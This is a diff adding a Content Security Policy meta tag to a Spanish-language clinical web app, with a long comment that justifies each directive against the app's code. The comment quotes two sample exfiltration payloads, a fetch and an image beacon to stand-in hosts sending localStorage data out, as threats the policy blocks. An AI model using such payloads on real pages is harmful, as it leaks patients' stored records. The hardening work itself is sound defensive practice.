@@ -2,6 +2,42 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
+<!-- ═══ CONTENT SECURITY POLICY ══════════════════════════════════════════════════════════════
+     QUÉ HACE Y QUÉ NO. Esta política NO impide que se ejecute un XSS: la app tiene 789
+     manejadores inline (onclick=...) y 7 bloques de script embebidos, así que `script-src` tiene
+     (OJO: sin escribir la etiqueta con sus signos de menor/mayor. El extractor de scan.py busca
+     la apertura por regex y no distingue comentario de código: ponerla acá partía el primer
+     bloque de JS y Semgrep pasaba de 99 hallazgos a 61 sin que se hubiera tocado una línea)
+     que llevar 'unsafe-inline' sí o sí. Quitarlo exigiría reescribir esos 789 manejadores como
+     addEventListener, que es otro trabajo y otro riesgo.
+
+     Lo que SÍ hace es cortarle las piernas a un XSS que ya ejecutó: impedirle SACAR los datos.
+     Para una app que guarda pacientes en localStorage, eso es lo que más vale:
+       · connect-src 'none'  → sin fetch, XHR, WebSocket ni sendBeacon. El payload clásico
+                               fetch('//x/?d='+btoa(JSON.stringify(localStorage))) no sale.
+       · img-src sin externos → mata el beacon por imagen, new Image().src='https://evil/?'+datos.
+       · form-action 'none'  → no se puede exfiltrar posteando un <form> inyectado.
+       · base-uri 'none'     → no se puede secuestrar el documento con un <base href> inyectado.
+       · default-src 'none'  → cierra de una vez media, workers, manifest y prefetch como canales.
+     Y no lleva 'unsafe-eval': la app no usa eval ni new Function (verificado), así que toda una
+     familia de payloads queda fuera sin costo.
+
+     CADA PERMISO ESTÁ MEDIDO CONTRA EL CÓDIGO, no puesto por si acaso:
+       · script-src 'unsafe-inline' → 7 bloques inline + 789 handlers. CERO scripts externos,
+         por eso no lleva 'self': si algún día se agrega un .js aparte, que falle y se decida.
+       · style-src 'unsafe-inline'  → 6 bloques de estilo + 1903 atributos style=.
+       · img-src 'self' data:       → las imágenes clínicas se guardan como data:image/...;base64
+                                      (ver escImgSrc). Sin `data:` desaparecen del historial.
+     Las descargas (backup, Analytics, CSV de INR) usan <a download href="blob:">, que es una
+     descarga y no la carga de un subrecurso: CSP no la gobierna, por eso no hay `blob:`.
+
+     DOS LÍMITES DEL <meta>, que no son opcionales sino del formato:
+       · `frame-ancestors` se IGNORA en meta — la protección de clickjacking necesita cabecera
+         HTTP, y GitHub Pages no deja mandar ninguna. Queda pendiente y no se puede cerrar acá.
+       · `report-uri`/`report-to` también se ignoran, así que NO hay modo «sólo reportar»: esta
+         política entra aplicando desde el primer render. Si algo se rompe, se ve roto.
+     ══════════════════════════════════════════════════════════════════════════════════════════ -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src 'self' data:; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CardioSalud — Aplicación</title>
 <style>
